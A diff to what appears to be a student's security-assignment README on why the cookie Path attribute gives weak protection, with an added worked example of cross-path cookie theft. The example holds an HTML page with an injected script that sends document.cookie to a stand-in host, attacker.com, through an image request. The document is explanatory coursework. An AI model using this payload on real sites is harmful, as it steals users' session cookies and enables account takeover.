@@ -129,27 +129,60 @@
 
 * Number of framable sites - 28
 * Number of non framable sites - 69
-* number of site did not resolve - 3
+* number of sites did not resolve - 3
 
 
  ## Question 2 - Frame path attack
  
  ### How the Path attribute for Cookies is not suitable for security
- 
 
+ * Example for limited protection against cross-site-scripting attacks.
+
+   Consider a website where users can post comments. The website sets a session cookie with a specific Path attribute ("/user") upon user login.
+
+   **Set-Cookie: sessionId=123; Path=/user*
+   
+In this case, a script is injected by an attacker into the insecure.html page on the same domain, but it is not located inside the "/user" path. The injected script steal the user's session cookie to a domain under the control of the attacker.
+
+*Insecure html page
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Insecure Page</title>
+</head>
+<body>
+    <h1>Welcome to our website!</h1>
+    <script>
+        // Simulating a malicious script injected by an attacker
+        const img = new Image();
+        img.src = "https://attacker.com/steal?cookie=" + document.cookie;
+    </script>
+</body>
+</html>
+
+ * Example futher explained.
+
+-The server tries to restrict access to pages under the "/user" path by setting the sessionId cookie with a Path attribute of "/user". 
+-Then the attacker injects a script into a different page (insecure.html) that runs in the user's browser. This script accesses the document.cookie property, which includes all accessible cookies, regardless of the Path attribute.
+-The image object created byy the inected script appends the user's cookie to the image URL. This URL points to a server controlled by the attacker **(https://attacker.com/steal?cookie= + document.cookie)* .
+-When the user visits the insecure.html page, the injected script runs, sending the user's session cookie to the attacker's server.
+
+  
  ### How a parent page can steal cookies from an iframed page if only the Path attribute is used in Set-Cookie.
 
  ### List of files
 
- * child.html - html page with a cookie and which is being framed by parent page
- * parent.html - html page which steel cookie from child page
- * index_c.s - server used to render child.html
- * index_p.js - server used to render parent.html
+ * [child.html](child.html) - html page with a cookie and which is being framed by parent page
+ * [parent.html](parent.html) - html page which steal cookie from child page
+ * [index_c.js](index_c.js) - server used to render child.html
+ * [index_p.js](index_p.js) - server used to render parent.html
 
  * Screenshot of child.html
    
  <kbd><img src="screenshots/child_page_with_cookie.png" width="700" ></kbd>
 
- * Screenshot of parent with stolen cookie.
+ * Screenshot of parent.html with stolen cookie.
 
   <kbd><img src="screenshots/parent_page with _stolen_cookie.png" width="700" ></kbd>  
